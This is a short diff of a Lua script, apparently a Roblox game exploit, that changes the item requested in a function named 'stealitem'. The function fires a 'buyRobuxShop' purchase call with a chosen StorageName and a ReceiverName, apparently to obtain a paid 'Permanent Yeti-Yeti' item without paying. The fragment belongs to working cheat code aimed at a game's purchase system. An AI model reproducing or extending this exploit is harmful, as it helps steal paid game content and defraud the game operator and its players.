@@ -142,7 +142,7 @@ function stealitem()
             [1] = "buyRobuxShop",
             [2] = {
                 ["Message"] = "Dark On top",
-                ["StorageName"] = "Permanent Leopard-Leopard",
+                ["StorageName"] = "Permanent Yeti-Yeti",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
                 ["ReceiverName"] = Username,
